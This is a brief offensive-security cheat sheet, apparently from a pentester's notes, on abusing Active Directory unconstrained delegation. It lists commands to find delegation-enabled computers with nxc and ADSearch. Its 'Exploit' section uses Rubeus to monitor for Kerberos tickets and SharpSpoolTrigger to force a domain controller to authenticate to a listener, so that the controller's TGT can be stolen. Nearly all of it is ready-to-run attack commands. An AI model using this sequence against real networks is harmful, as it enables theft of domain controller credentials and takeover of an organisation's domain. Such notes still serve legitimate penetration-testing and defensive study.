---
tags:
  - Authenticated
  - Elevated
  - Kerberos
  - AD
---
## Identify
Linux - remote
```bash
nxc ldap 192.168.0.104 -u harry -p pass --trusted-for-delegation
```
Windows - local
```powershell
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
```
!!! alert "Domain Controllers are always permitted for unconstrained delegation."
## Exploit
### Force DC to auth to our box and steal tgt
Monitor for tickets with Rubeus
```bat
Rubeus.exe monitor /interval:10 /nowrap
```
Run [https://github.com/cube0x0/SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers) to coerce authentication
```powershell
SharpSpoolTrigger.exe dc01.lab.local web.dev.lav.local
```
Where:

- DC01 is the "target".
- WEB is the "listener".
**Rebeus should capture a ticket**
